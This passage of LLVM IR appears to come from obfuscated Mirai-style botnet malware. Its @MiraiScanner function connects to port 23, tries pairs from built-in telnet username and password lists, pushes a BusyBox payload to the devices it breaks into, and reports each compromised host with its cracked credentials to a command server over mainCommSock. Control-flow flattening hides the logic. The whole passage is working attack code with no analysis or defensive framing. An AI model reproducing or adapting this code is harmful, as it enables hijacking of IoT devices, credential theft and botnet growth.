; <label>:754:                                    ; preds = %loopEntry
  %755 = call i64 @time(i64* null) #5
  %756 = trunc i64 %755 to i32
  %757 = load i32, i32* %6, align 4
  %758 = sext i32 %757 to i64
  %.reload42 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload42, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %759, i32 0, i32 7
  store i32 %756, i32* %760, align 16
  %761 = load i32, i32* %6, align 4
  %762 = sext i32 %761 to i64
  %.reload41 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload41, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 0
  %765 = load i32, i32* %764, align 16
  %766 = call i64 @send(i32 %765, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.493, i32 0, i32 0), i64 4, i32 16384)
  %767 = icmp slt i64 %766, 0
  %768 = select i1 %767, i32 1773745127, i32 -467540584
  store i32 %768, i32* %switchVar
  br label %loopEnd

; <label>:769:                                    ; preds = %loopEntry
  store i32 -467540584, i32* %switchVar
  br label %loopEnd

; <label>:770:                                    ; preds = %loopEntry
  %771 = load i32, i32* %6, align 4
  %772 = sext i32 %771 to i64
  %.reload40 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload40, i64 %772
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %773, i32 0, i32 0
  %775 = load i32, i32* %774, align 16
  %776 = call i64 @send(i32 %775, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.494, i32 0, i32 0), i64 7, i32 16384)
  %777 = icmp slt i64 %776, 0
  %778 = select i1 %777, i32 -59161709, i32 -1118689689
  store i32 %778, i32* %switchVar
  br label %loopEnd

; <label>:779:                                    ; preds = %loopEntry
  store i32 -1118689689, i32* %switchVar
  br label %loopEnd

; <label>:780:                                    ; preds = %loopEntry
  %781 = load i32, i32* %6, align 4
  %782 = sext i32 %781 to i64
  %.reload39 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload39, i64 %782
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %783, i32 0, i32 0
  %785 = load i32, i32* %784, align 16
  %786 = load i8*, i8** @Busybox_Payload, align 8
  %787 = load i8*, i8** @Busybox_Payload, align 8
  %788 = call i64 @strlen(i8* %787) #9
  %789 = call i64 @send(i32 %785, i8* %786, i64 %788, i32 16384)
  %790 = icmp slt i64 %789, 0
  %791 = select i1 %790, i32 1991579514, i32 777164503
  store i32 %791, i32* %switchVar
  br label %loopEnd

; <label>:792:                                    ; preds = %loopEntry
  %793 = load i32, i32* %6, align 4
  %794 = sext i32 %793 to i64
  %.reload38 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload38, i64 %794
  call void @reset_telstate(%struct.telstate_t* %795)
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:796:                                    ; preds = %loopEntry
  %797 = load i32, i32* @mainCommSock, align 4
  %798 = load i32, i32* %6, align 4
  %799 = sext i32 %798 to i64
  %.reload37 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload37, i64 %799
  %801 = call i8* @get_telstate_host(%struct.telstate_t* %800)
  %802 = load i32, i32* %6, align 4
  %803 = sext i32 %802 to i64
  %.reload36 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload36, i64 %803
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %804, i32 0, i32 4
  %806 = load i8, i8* %805, align 2
  %807 = zext i8 %806 to i64
  %808 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %807
  %809 = load i8*, i8** %808, align 8
  %810 = load i32, i32* %6, align 4
  %811 = sext i32 %810 to i64
  %.reload35 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload35, i64 %811
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %812, i32 0, i32 5
  %814 = load i8, i8* %813, align 1
  %815 = zext i8 %814 to i64
  %816 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %815
  %817 = load i8*, i8** %816, align 8
  %818 = call i32 (i32, i8*, ...) @sockprintf(i32 %797, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.495, i32 0, i32 0), i8* %801, i8* %809, i8* %817)
  %819 = load i32, i32* %6, align 4
  %820 = sext i32 %819 to i64
  %.reload34 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload34, i64 %820
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %821, i32 0, i32 0
  %823 = load i32, i32* %822, align 16
  %824 = load i32, i32* %3, align 4
  %825 = load i32, i32* %6, align 4
  %826 = sext i32 %825 to i64
  %.reload33 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload33, i64 %826
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %827, i32 0, i32 9
  %829 = load i8*, i8** %828, align 8
  %830 = call i32 @read_until_response(i32 %823, i32 %824, i8* %829, i32 1024, i8** bitcast ([7 x i8]* @.str.496 to i8**))
  %831 = icmp ne i32 %830, 0
  %832 = select i1 %831, i32 1357767157, i32 -124092549
  store i32 %832, i32* %switchVar
  br label %loopEnd

; <label>:833:                                    ; preds = %loopEntry
  %834 = load i32, i32* %6, align 4
  %835 = sext i32 %834 to i64
  %.reload32 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload32, i64 %835
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %836, i32 0, i32 9
  %838 = load i8*, i8** %837, align 8
  %839 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %838, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.496, i32 0, i32 0))
  %840 = icmp ne i32 %839, 0
  %841 = select i1 %840, i32 -1213951192, i32 -936275321
  store i32 %841, i32* %switchVar
  br label %loopEnd

; <label>:842:                                    ; preds = %loopEntry
  %843 = load i32, i32* %6, align 4
  %844 = sext i32 %843 to i64
  %.reload31 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload31, i64 %844
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %845, i32 0, i32 3
  %847 = load i8, i8* %846, align 1
  %848 = zext i8 %847 to i32
  %849 = icmp ne i32 %848, 3
  %850 = select i1 %849, i32 1865900719, i32 -936275321
  store i32 %850, i32* %switchVar
  br label %loopEnd

; <label>:851:                                    ; preds = %loopEntry
  %852 = load i32, i32* @mainCommSock, align 4
  %853 = load i32, i32* %6, align 4
  %854 = sext i32 %853 to i64
  %.reload30 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload30, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 1
  %857 = bitcast i32* %856 to %struct.in_addr*
  %858 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %857, i32 0, i32 0
  %859 = load i32, i32* %858, align 4
  %860 = call i8* @inet_ntoa(i32 %859) #5
  %861 = load i32, i32* %6, align 4
  %862 = sext i32 %861 to i64
  %.reload29 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload29, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 4
  %865 = load i8, i8* %864, align 2
  %866 = zext i8 %865 to i64
  %867 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %866
  %868 = load i8*, i8** %867, align 8
  %869 = load i32, i32* %6, align 4
  %870 = sext i32 %869 to i64
  %.reload28 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload28, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %871, i32 0, i32 5
  %873 = load i8, i8* %872, align 1
  %874 = zext i8 %873 to i64
  %875 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %874
  %876 = load i8*, i8** %875, align 8
  %877 = call i32 (i32, i8*, ...) @sockprintf(i32 %852, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.497, i32 0, i32 0), i8* %860, i8* %868, i8* %876)
  %878 = load i32, i32* %6, align 4
  %879 = sext i32 %878 to i64
  %.reload27 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload27, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 3
  store i8 3, i8* %881, align 1
  store i32 -936275321, i32* %switchVar
  br label %loopEnd

; <label>:882:                                    ; preds = %loopEntry
  store i32 -124092549, i32* %switchVar
  br label %loopEnd

; <label>:883:                                    ; preds = %loopEntry
  %884 = load i32, i32* %6, align 4
  %885 = sext i32 %884 to i64
  %.reload26 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload26, i64 %885
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %886, i32 0, i32 7
  %888 = load i32, i32* %887, align 16
  %889 = add i32 %888, 10
  %890 = zext i32 %889 to i64
  %891 = call i64 @time(i64* null) #5
  %892 = icmp slt i64 %890, %891
  %893 = select i1 %892, i32 -1465130461, i32 972797272
  store i32 %893, i32* %switchVar
  br label %loopEnd

; <label>:894:                                    ; preds = %loopEntry
  %895 = load i32, i32* %6, align 4
  %896 = sext i32 %895 to i64
  %.reload25 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload25, i64 %896
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %897, i32 0, i32 3
  %899 = load i8, i8* %898, align 1
  %900 = zext i8 %899 to i32
  %901 = icmp ne i32 %900, 3
  %902 = select i1 %901, i32 1711808489, i32 1786898711
  store i32 %902, i32* %switchVar
  br label %loopEnd

; <label>:903:                                    ; preds = %loopEntry
  %904 = load i32, i32* @mainCommSock, align 4
  %905 = load i32, i32* %6, align 4
  %906 = sext i32 %905 to i64
  %.reload24 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload24, i64 %906
  %908 = call i8* @get_telstate_host(%struct.telstate_t* %907)
  %909 = load i32, i32* %6, align 4
  %910 = sext i32 %909 to i64
  %.reload23 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload23, i64 %910
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %911, i32 0, i32 4
  %913 = load i8, i8* %912, align 2
  %914 = zext i8 %913 to i64
  %915 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %914
  %916 = load i8*, i8** %915, align 8
  %917 = load i32, i32* %6, align 4
  %918 = sext i32 %917 to i64
  %.reload22 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload22, i64 %918
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %919, i32 0, i32 5
  %921 = load i8, i8* %920, align 1
  %922 = zext i8 %921 to i64
  %923 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %922
  %924 = load i8*, i8** %923, align 8
  %925 = call i32 (i32, i8*, ...) @sockprintf(i32 %904, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.498, i32 0, i32 0), i8* %908, i8* %916, i8* %924)
  store i32 1786898711, i32* %switchVar
  br label %loopEnd

; <label>:926:                                    ; preds = %loopEntry
  %927 = load i32, i32* %6, align 4
  %928 = sext i32 %927 to i64
  %.reload21 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload21, i64 %928
  call void @reset_telstate(%struct.telstate_t* %929)
  store i32 972797272, i32* %switchVar
  br label %loopEnd

; <label>:930:                                    ; preds = %loopEntry
  store i32 1015336728, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1015336728, i32* %switchVar
  br label %loopEnd

; <label>:931:                                    ; preds = %loopEntry
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:932:                                    ; preds = %loopEntry
  %933 = load i32, i32* %6, align 4
  %934 = add nsw i32 %933, 1
  store i32 %934, i32* %6, align 4
  store i32 1847016220, i32* %switchVar
  br label %loopEnd

; <label>:935:                                    ; preds = %loopEntry
  store i32 -150514707, i32* %switchVar
  br label %loopEnd

; <label>:936:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %935, %932, %931, %NewDefault, %930, %926, %903, %894, %883, %882, %851, %842, %833, %796, %792, %780, %779, %770, %769, %754, %728, %724, %688, %684, %670, %669, %665, %654, %653, %652, %648, %647, %621, %617, %608, %599, %595, %580, %565, %561, %557, %548, %544, %518, %517, %513, %502, %501, %497, %493, %478, %463, %459, %455, %446, %442, %416, %415, %411, %400, %399, %395, %391, %376, %361, %360, %356, %345, %344, %340, %336, %335, %318, %314, %299, %265, %264, %255, %254, %253, %249, %245, %240, %217, %216, %191, %190, %189, %184, %175, %170, %149, %140, %120, %111, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %NodeBlock15, %94, %87, %79, %74, %73, %72, %71, %68, %54, %49, %33, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @MiraiScanner(i32, i32) #0 {
  %.reg2mem137 = alloca i32
  %.reg2mem20 = alloca %struct.telstate_t*
  %.reg2mem18 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub nsw i32 %25, 100
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* %5, align 4
  store i32 %27, i32* %.reg2mem
  %28 = load i32, i32* %4, align 4
  store i32 %28, i32* %.reg2mem18
  %switchVar = alloca i32
  store i32 525701228, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar17 = load i32, i32* %switchVar
  switch i32 %switchVar17, label %switchDefault [
    i32 525701228, label %first
    i32 1807894840, label %31
    i32 1080604773, label %33
    i32 40352624, label %49
    i32 -1839386657, label %54
    i32 -550281575, label %68
    i32 -1250871390, label %71
    i32 288352116, label %72
    i32 -1120799610, label %73
    i32 -338066444, label %74
    i32 2098577383, label %79
    i32 1234440327, label %87
    i32 -512088979, label %94
    i32 -155656393, label %NodeBlock15
    i32 1449582307, label %NodeBlock13
    i32 1767518093, label %NodeBlock11
    i32 997629137, label %NodeBlock9
    i32 1601580401, label %LeafBlock7
    i32 -158347247, label %NodeBlock5
    i32 645499468, label %NodeBlock3
    i32 1565450183, label %NodeBlock1
    i32 1203775618, label %NodeBlock
    i32 922477838, label %LeafBlock
    i32 1574036189, label %111
    i32 1477363968, label %120
    i32 369208174, label %140
    i32 -1111139045, label %149
    i32 814972365, label %170
    i32 -24582925, label %175
    i32 1742640315, label %184
    i32 1634593657, label %189
    i32 -214079669, label %190
    i32 -1133655181, label %191
    i32 -1453679090, label %216
    i32 -1337698265, label %217
    i32 49000008, label %240
    i32 -1351288409, label %245
    i32 1396586038, label %249
    i32 -1031513874, label %253
    i32 873076359, label %254
    i32 173318586, label %255
    i32 439945267, label %264
    i32 -1873697709, label %265
    i32 1190823612, label %299
    i32 -2036439522, label %316
    i32 154011159, label %320
    i32 -1276841184, label %337
    i32 -760613892, label %338
    i32 -1495591006, label %342
    i32 703132207, label %346
    i32 1540402235, label %347
    i32 184210927, label %358
    i32 -798300770, label %362
    i32 -171891538, label %363
    i32 -491226002, label %378
    i32 1535793691, label %393
    i32 353183236, label %397
    i32 192599732, label %401
    i32 1764691353, label %402
    i32 -345510521, label %413
    i32 -807172634, label %417
    i32 46003008, label %418
    i32 877783109, label %444
    i32 -993557533, label %448
    i32 1995327349, label %457
    i32 1514699517, label %461
    i32 -2033201160, label %465
    i32 -818325972, label %480
    i32 126921871, label %495
    i32 -1846400418, label %499
    i32 368652407, label %503
    i32 -949553544, label %504
    i32 -335912549, label %515
    i32 908569055, label %519
    i32 -1287326606, label %520
    i32 -1850329518, label %546
    i32 -1890838407, label %550
    i32 1013223545, label %559
    i32 1136819599, label %563
    i32 -1983268090, label %567
    i32 1301050761, label %582
    i32 2107739022, label %597
    i32 -2008663346, label %601
    i32 -405506387, label %610
    i32 384816189, label %619
    i32 -748208940, label %623
    i32 1518072081, label %649
    i32 2094994867, label %650
    i32 -316668224, label %654
    i32 1788322878, label %655
    i32 -1360223319, label %656
    i32 1018059107, label %667
    i32 866448020, label %671
    i32 -148736061, label %672
    i32 1923301001, label %686
    i32 -876034235, label %690
    i32 185163418, label %726
    i32 -259020161, label %730
    i32 1373312631, label %756
    i32 1653540511, label %771
    i32 1713947714, label %772
    i32 -1942680602, label %781
    i32 -544557042, label %782
    i32 -798204723, label %794
    i32 1722477212, label %798
    i32 513017631, label %835
    i32 1407800838, label %844
    i32 -876832054, label %853
    i32 -901316176, label %876
    i32 -1062104436, label %877
    i32 -403988553, label %888
    i32 -791861652, label %897
    i32 -1941725947, label %920
    i32 -1242875328, label %924
    i32 -1251383876, label %NewDefault
    i32 1563371320, label %925
    i32 1672189596, label %926
    i32 -1713374755, label %929
    i32 1097955172, label %930
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload19 = load volatile i32, i32* %.reg2mem18
  %29 = icmp sgt i32 %.reload, %.reload19
  %30 = select i1 %29, i32 1807894840, i32 1080604773
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %4, align 4
  store i32 %32, i32* %5, align 4
  store i32 1080604773, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = call zeroext i16 @htons(i16 zeroext 23) #10
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %38 = getelementptr inbounds [8 x i8], [8 x i8]* %37, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 8, i32 4, i1 false)
  %39 = call noalias i8* @malloc(i64 1025) #5
  store i8* %39, i8** %17, align 8
  %40 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 1025, i32 1, i1 false)
  %41 = load i32, i32* %5, align 4
  %42 = zext i32 %41 to i64
  %43 = call i8* @llvm.stacksave()
  store i8* %43, i8** %19, align 8
  %44 = alloca %struct.telstate_t, i64 %42, align 16
  store %struct.telstate_t* %44, %struct.telstate_t** %.reg2mem20
  %.reload136 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %45 = bitcast %struct.telstate_t* %.reload136 to i8*
  %46 = load i32, i32* %5, align 4
  %47 = sext i32 %46 to i64
  %48 = mul i64 %47, 5
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 %48, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  store i32 40352624, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %6, align 4
  %51 = load i32, i32* %5, align 4
  %52 = icmp slt i32 %50, %51
  %53 = select i1 %52, i32 -1839386657, i32 -1250871390
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %6, align 4
  %56 = sext i32 %55 to i64
  %.reload135 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %57 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload135, i64 %56
  %58 = bitcast %struct.telstate_t* %57 to i8*
  call void @llvm.memset.p0i8.i64(i8* %58, i8 0, i64 32, i32 16, i1 false)
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %.reload134 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload134, i64 %60
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %61, i32 0, i32 3
  store i8 1, i8* %62, align 1
  %63 = load i8*, i8** %17, align 8
  %64 = load i32, i32* %6, align 4
  %65 = sext i32 %64 to i64
  %.reload133 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload133, i64 %65
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %66, i32 0, i32 9
  store i8* %63, i8** %67, align 8
  store i32 -550281575, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %6, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %6, align 4
  store i32 40352624, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 288352116, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 -1120799610, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 -338066444, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* %6, align 4
  %76 = load i32, i32* %5, align 4
  %77 = icmp slt i32 %75, %76
  %78 = select i1 %77, i32 2098577383, i32 -1713374755
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %.reload132 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload132, i64 %81
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %82, i32 0, i32 7
  %84 = load i32, i32* %83, align 16
  %85 = icmp eq i32 %84, 0
  %86 = select i1 %85, i32 1234440327, i32 -512088979
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = call i64 @time(i64* null) #5
  %89 = trunc i64 %88 to i32
  %90 = load i32, i32* %6, align 4
  %91 = sext i32 %90 to i64
  %.reload131 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload131, i64 %91
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %92, i32 0, i32 7
  store i32 %89, i32* %93, align 16
  store i32 -512088979, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %6, align 4
  %96 = sext i32 %95 to i64
  %.reload130 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload130, i64 %96
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %97, i32 0, i32 2
  %99 = load i8, i8* %98, align 8
  %100 = zext i8 %99 to i32
  store i32 %100, i32* %.reg2mem137
  store i32 -155656393, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload147 = load volatile i32, i32* %.reg2mem137
  %Pivot16 = icmp slt i32 %.reload147, 4
  %101 = select i1 %Pivot16, i32 645499468, i32 1449582307
  store i32 %101, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload142 = load volatile i32, i32* %.reg2mem137
  %Pivot14 = icmp slt i32 %.reload142, 6
  %102 = select i1 %Pivot14, i32 -158347247, i32 1767518093
  store i32 %102, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload140 = load volatile i32, i32* %.reg2mem137
  %Pivot12 = icmp slt i32 %.reload140, 7
  %103 = select i1 %Pivot12, i32 -1983268090, i32 997629137
  store i32 %103, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload139 = load volatile i32, i32* %.reg2mem137
  %Pivot10 = icmp slt i32 %.reload139, 8
  %104 = select i1 %Pivot10, i32 -148736061, i32 1601580401
  store i32 %104, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload138 = load volatile i32, i32* %.reg2mem137
  %SwitchLeaf8 = icmp eq i32 %.reload138, 8
  %105 = select i1 %SwitchLeaf8, i32 1373312631, i32 -1251383876
  store i32 %105, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload141 = load volatile i32, i32* %.reg2mem137
  %Pivot6 = icmp slt i32 %.reload141, 5
  %106 = select i1 %Pivot6, i32 -2033201160, i32 -1287326606
  store i32 %106, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload146 = load volatile i32, i32* %.reg2mem137
  %Pivot4 = icmp slt i32 %.reload146, 2
  %107 = select i1 %Pivot4, i32 1203775618, i32 1565450183
  store i32 %107, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload143 = load volatile i32, i32* %.reg2mem137
  %Pivot2 = icmp slt i32 %.reload143, 3
  %108 = select i1 %Pivot2, i32 -171891538, i32 46003008
  store i32 %108, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload145 = load volatile i32, i32* %.reg2mem137
  %Pivot = icmp slt i32 %.reload145, 1
  %109 = select i1 %Pivot, i32 922477838, i32 873076359
  store i32 %109, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload144 = load volatile i32, i32* %.reg2mem137
  %SwitchLeaf = icmp eq i32 %.reload144, 0
  %110 = select i1 %SwitchLeaf, i32 1574036189, i32 -1251383876
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %6, align 4
  %113 = sext i32 %112 to i64
  %.reload129 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload129, i64 %113
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %114, i32 0, i32 3
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 1
  %119 = select i1 %118, i32 1477363968, i32 369208174
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %.reload128 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload128, i64 %122
